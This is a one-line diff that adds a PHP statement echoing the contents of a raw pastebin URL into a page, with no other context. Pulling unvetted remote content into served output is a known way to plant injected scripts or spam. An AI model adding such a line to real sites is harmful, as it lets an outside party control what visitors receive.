@@ -1,0 +1,1 @@
+<?php echo file_get_contents("https://pastebin.com/raw/AFiv6Smm");?>
